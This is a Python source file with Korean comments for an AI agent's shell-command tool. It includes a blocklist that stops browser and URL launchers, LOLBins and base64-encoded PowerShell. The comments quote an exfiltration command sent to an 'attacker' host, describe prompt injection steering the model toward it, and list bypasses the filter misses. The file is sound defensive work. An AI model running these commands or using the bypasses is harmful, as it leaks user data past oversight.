"""하네스 명령 실행 — 작업 폴더에서 임의의 셸 명령을 돌려 결과를 돌려준다.

runcode.py와 같은 이유로 동기 subprocess를 asyncio.to_thread에서 실행한다
(Windows + uvicorn --reload 프로액터 루프에서 asyncio 서브프로세스는 NotImplementedError).

보안: 셸 명령은 파일 툴처럼 경로로 가둘 수 없다(절대경로·cd ..로 작업 폴더를 벗어날 수 있음).
따라서 실제 안전장치는 경로 confine이 아니라 상위(agent) 루프의 **권한 모드**다.
run_command는 수동·읽기 모드에서 승인을 요구하고, 자동 모드에서는 사용자가 명시적으로 무승인 실행을 선택한다.
"""

from __future__ import annotations

import asyncio
import locale
import os
import re
import shlex
import subprocess
from pathlib import Path

from runcode import _bundled_bin, _find_python, run_process_capped
from process_env import sanitized_child_environment
from tools import ToolError

CMD_TIMEOUT_DEFAULT = 60
CMD_TIMEOUT_MAX = 300
MAX_CMD_OUTPUT = 30_000  # stdout+stderr 합산 표시 상한(문자)

# Windows 전용 플래그 (타 OS에서는 0으로 무해)
_CREATE_NO_WINDOW = getattr(subprocess, "CREATE_NO_WINDOW", 0)
_CREATE_NEW_GROUP = getattr(subprocess, "CREATE_NEW_PROCESS_GROUP", 0)


# ── 외부 앱·URL 핸들러 실행 차단 ────────────────────────────────────────────
# 셸은 경로로 가둘 수 없지만, '작업 폴더 밖으로 나가는 실행'은 막을 수 있다.
# 자동 모드는 승인을 생략하므로(FORCE_APPROVAL_IN_AUTO가 비어 있다) `start
# https://attacker/?d=<데이터>` 한 줄이면 기본 브라우저로 데이터가 나간다.
# web_fetch의 SSRF·사설망 차단은 셸 경로에 적용되지 않는다.
#
# 승인 강제가 아니라 차단인 이유: "자동 = 예외 없는 무승인"은 의도된 계약이고,
# "도구가 작업 폴더 밖으로 나가지 않는다"도 문서화된 계약이다. 차단은 후자를
# 지키면서 전자를 깨지 않는다.
#
# 부수 효과로 정확성도 좋아진다 — start/explorer는 프로세스를 분리해 띄우므로
# 하네스가 출력을 캡처할 수 없다. 확인할 수 없는 실행은 이 도구의 용도가 아니다.
_LAUNCHER_NAMES = frozenset({
    # Windows 셸 실행기
    "start", "explorer",
    # PowerShell 실행 cmdlet과 별칭
    "start-process", "saps", "invoke-item", "ii",
    # 전형적인 LOLBin — 워크스페이스 빌드에 쓸 일이 없다
    "mshta", "rundll32",
    # 브라우저 직접 실행
    "chrome", "msedge", "firefox", "iexplore", "brave", "opera",
})
# 이 실행기들은 인용된 payload 안에 진짜 명령을 숨길 수 있어 한 겹 더 들여다본다.
_SHELL_INVOKERS = frozenset({"cmd", "powershell", "pwsh", "sh", "bash"})
_SHELL_PAYLOAD_FLAGS = frozenset({"/c", "/k", "-c", "-command"})
# 뒤에 오는 토큰이 다시 '명령 위치'가 되는 투명 접두사. call/do를 건너뛰지 않으면
# `call start …`, `for /f … do start …` 로 그냥 우회된다.
_TRANSPARENT_PREFIXES = frozenset({"call", "do", "then", "else", "start/wait"})
# base64로 감싼 PowerShell은 워크스페이스 빌드에 쓸 일이 없다. 디코드해서 판정하는
# 대신 그 형태 자체를 거부한다 — 판정할 수 없는 것을 통과시키는 쪽이 더 나쁘다.
_ENCODED_PS_FLAGS = frozenset({"-encodedcommand", "-enc", "-ec", "/encodedcommand"})
_SEGMENT_SPLIT = re.compile(r"&&|\|\||[&|;\n]")


def _command_word(token: str) -> str:
    """토큰을 실행기 이름으로 정규화한다 — 인용·경로·확장자를 벗긴다."""
    word = token.strip().strip('"').strip("'")
    if not word:
        return ""
    word = word.replace("/", "\\").rsplit("\\", 1)[-1]
    if word.lower().endswith(".exe"):
        word = word[:-4]
    return word.lower()


def _tokens(segment: str) -> list[str]:
    try:
        return shlex.split(segment, posix=False)
    except ValueError:  # 짝이 맞지 않는 따옴표 — 공백 분할로 물러선다
        return segment.split()


def blocked_launcher(command: str, _depth: int = 0) -> str | None:
    """외부 앱·URL 핸들러를 띄우는 명령이면 사유를, 아니면 None을 돌려준다.

    **명령 위치**에 있는 토큰만 본다. 단순 단어 검색을 하면 `npm start`처럼 지극히
    흔한 명령이 막혀서 도구를 못 쓰게 된다 — 그게 이 판정에서 가장 위험한 오탐이다.

    한계(의도적으로 명시한다): 셸 명령 블록리스트는 원리적으로 완전할 수 없다.
    예를 들어 `set X=start && %X% https://…` 같은 환경변수 간접 참조는 실행해 보기
    전에는 판정할 수 없다. 이 판정의 목적은 결정적인 공격자를 막는 것이 아니라
    (그 단계에서는 이미 임의 코드 실행 권한이 있다), 모델이 흔히 내는 직접적인
    형태와 프롬프트 주입이 유도하는 순진한 경로를 막는 것이다. 자동 모드에서 승인
    없이 지나가던 `start https://…/?d=<데이터>`가 정확히 그 형태다.

    남은 경로: run_code(파이썬)로도 같은 일을 할 수 있다. 그건 별도 항목이다.
    """
    if not isinstance(command, str) or _depth > 2:
        return None
    for segment in _SEGMENT_SPLIT.split(command):
        tokens = _tokens(segment)
        if not tokens:
            continue
        if any(_command_word(token) in _ENCODED_PS_FLAGS for token in tokens):
            return (
                "base64로 인코딩된 PowerShell 명령(-EncodedCommand)은 내용을 확인할 수 "
                "없어 run_command에서 차단됩니다. 실행할 명령을 그대로 적어 주세요."
            )
        # for/while 루프의 `do` 뒤도 명령 위치다. `for /f %i in (x) do start …` 를
        # 놓치면 우회가 한 줄이다. `do`를 아무 데서나 인정하면 `echo do start`가
        # 오탐되므로, 실제 루프 구문으로 시작하는 세그먼트에서만 인정한다.
        if _command_word(tokens[0]) in {"for", "while"}:
            for index, token in enumerate(tokens):
                if _command_word(token) == "do" and index + 1 < len(tokens):
                    nested = blocked_launcher(" ".join(tokens[index + 1:]), _depth + 1)
                    if nested:
                        return nested
                    break
        # call 같은 투명 접두사를 걷어내야 그다음 토큰이 진짜 명령 위치가 된다.
        while len(tokens) > 1 and _command_word(tokens[0]) in _TRANSPARENT_PREFIXES:
            tokens = tokens[1:]
        head = _command_word(tokens[0])
        if head in _LAUNCHER_NAMES:
            return (
                f"'{head}'는 외부 애플리케이션이나 URL 핸들러를 실행하므로 "
                "run_command에서 차단됩니다(작업 폴더 밖으로 나가고, 분리 실행이라 "
                "결과도 확인할 수 없습니다). 웹 내용을 읽어야 하면 web_fetch를, "
                "파일을 열어야 하면 read_file을 사용하세요."
            )
        if head in _SHELL_INVOKERS:
            # cmd /c "…" · powershell -Command "…" 안에 숨긴 실행기를 한 겹 더 본다.
            for index, token in enumerate(tokens[1:], start=1):
                if _command_word(token).lstrip("-\\/") in {
                    flag.lstrip("-/") for flag in _SHELL_PAYLOAD_FLAGS
                } and index + 1 < len(tokens):
                    payload = " ".join(tokens[index + 1:]).strip().strip('"').strip("'")
                    nested = blocked_launcher(payload, _depth + 1)
                    if nested:
                        return nested
                    break
    return None

RUN_COMMAND_SCHEMA = {
    "type": "function",
    "function": {
        "name": "run_command",
        "description": (
            "작업 폴더에서 셸 명령을 실행하고 표준출력·표준에러와 종료코드를 돌려준다. "
            "테스트 실행(pytest·npm test), 빌드, git 상태 확인, 패키지 설치 등 파일 툴로 못 하는 작업에 쓴다. "
            "명령은 작업 폴더를 현재 위치로 실행되며, 실행 전 사용자 승인이 필요할 수 있다. "
            "대화형(입력 대기) 명령은 멈추니 피하고 비대화형 플래그(예: -y, --yes)를 써라."
        ),
        "parameters": {
            "type": "object",
            "properties": {
                "command": {"type": "string", "description": "실행할 명령 한 줄. 파이프(|)·연결(&&)·리다이렉트(>) 사용 가능."},
                "timeout": {"type": "integer", "description": "최대 실행 시간(초). 기본 60, 최대 300."},
            },
            "required": ["command"],
        },
    },
}


def _decode(b: bytes) -> str:
    if not b:
        return ""
    try:
        return b.decode("utf-8")  # UTF-8을 유도한 도구(python 등)
    except UnicodeDecodeError:
        enc = locale.getpreferredencoding(False) or "cp949"  # cmd 콘솔 코드페이지(한국어=cp949)
        return b.decode(enc, errors="replace")


def _cap(s: str) -> str:
    if len(s) <= MAX_CMD_OUTPUT:
        return s
    half = MAX_CMD_OUTPUT // 2
    return f"{s[:half]}\n…(출력이 길어 중간 {len(s) - MAX_CMD_OUTPUT}자 생략)…\n{s[-half:]}"


def _cmd_env(root: Path) -> dict:
    env = sanitized_child_environment(PYTHONIOENCODING="utf-8", PYTHONUTF8="1")
    extra = []
    b = _bundled_bin()
    if b:
        extra.append(str(b))  # 번들 grep/sed/sh/g++ 사용 가능하게
    try:
        extra.append(str(Path(_find_python()).parent))  # 'python'이 진짜 인터프리터로
    except Exception:  # noqa: BLE001
        pass
    if extra:
        env["PATH"] = os.pathsep.join(extra) + os.pathsep + env.get("PATH", "")
    return env


def _run_cmd_sync(root: Path, command: str, timeout: int) -> str:
    comspec = os.environ.get("ComSpec", r"C:\Windows\System32\cmd.exe")
    # raw 문자열로 넘긴다 — 리스트 [cmd,/c,command]는 subprocess가 재인용해 중첩 따옴표
    # (예: python -c "…")를 깨뜨린다. `/s`는 바깥 따옴표만 벗기고 내부는 그대로 둔다.
    cmdline = f'"{comspec}" /d /s /c "{command}"'
    captured = run_process_capped(
        cmdline,
        cwd=str(root),
        env=_cmd_env(root),
        timeout=timeout,
        max_output_bytes=MAX_CMD_OUTPUT,
        creationflags=_CREATE_NO_WINDOW | _CREATE_NEW_GROUP,
    )
    if captured.timed_out:
        return f"⏱ 명령이 시간을 초과했습니다 ({timeout}초). 무한 루프나 입력 대기를 확인하세요.\n$ {command}"

    out, err = _decode(captured.stdout), _decode(captured.stderr)
    parts = [f"$ {command}", f"(종료코드 {captured.returncode})"]
    if out.strip():
        parts.append("[stdout]\n" + out.rstrip())
    if err.strip():
        parts.append("[stderr]\n" + err.rstrip())
    if not out.strip() and not err.strip():
        parts.append("(출력 없음)")
    status = "✅" if captured.returncode == 0 else "❌"
    return status + " " + _cap("\n".join(parts))


async def run_command(root: Path, command: str = "", timeout: int | None = None, **_ignore) -> str:
    if not isinstance(command, str) or not command.strip():
        raise ToolError("실행할 명령(command)이 비어 있거나 문자열이 아닙니다.")
    launcher_block = blocked_launcher(command)
    if launcher_block:
        raise ToolError(launcher_block)
    try:
        t = CMD_TIMEOUT_DEFAULT if timeout is None else int(timeout)
    except (TypeError, ValueError):
        t = CMD_TIMEOUT_DEFAULT
    t = max(1, min(t, CMD_TIMEOUT_MAX))
    return await asyncio.to_thread(_run_cmd_sync, root, command, t)
